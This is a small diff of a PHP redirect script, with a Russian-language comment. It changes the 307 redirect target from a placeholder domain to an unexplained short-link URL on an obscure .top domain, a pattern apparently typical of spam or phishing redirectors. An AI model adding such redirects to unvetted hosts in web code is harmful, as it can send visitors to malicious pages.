@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://play.example/');
+header('Location: https://aahypershifttech.top/8bMFQb');
 exit();
 ?>
